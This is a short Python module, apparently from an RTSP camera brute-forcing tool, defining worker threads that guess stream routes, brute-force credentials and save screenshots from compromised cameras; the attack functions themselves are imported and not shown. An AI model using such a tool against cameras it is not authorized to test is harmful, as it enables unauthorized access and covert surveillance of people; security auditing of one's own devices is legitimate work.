import threading
from modules import utils
from queue import Queue
import sys

sys.path.append("..")
import config

from .attack import attack_route, attack_credentials, get_screenshot
from .rtsp import RTSPClient


def brute_routes(input_queue: Queue, output_queue: Queue) -> None:
    while True:
        target: RTSPClient = input_queue.get()
        if target is None:
            break

        result = attack_route(target)
        if result:
            utils.detect_auth_method(result)
            output_queue.put(result)

        input_queue.task_done()


def brute_credentials(input_queue: Queue, output_queue: Queue) -> None:
    while True:
        target: RTSPClient = input_queue.get()
        if target is None:
            break

        result = attack_credentials(target)
        if result:
            output_queue.put(target)

        input_queue.task_done()


def screenshot_targets(input_queue: Queue) -> None:
    while True:
        target: RTSPClient = input_queue.get()
        if target is None:
            break

        image = get_screenshot(target)
        if image:
            utils.append_result(config.RESULT_FILE, config.HTML_FILE, image, target)

        input_queue.task_done()
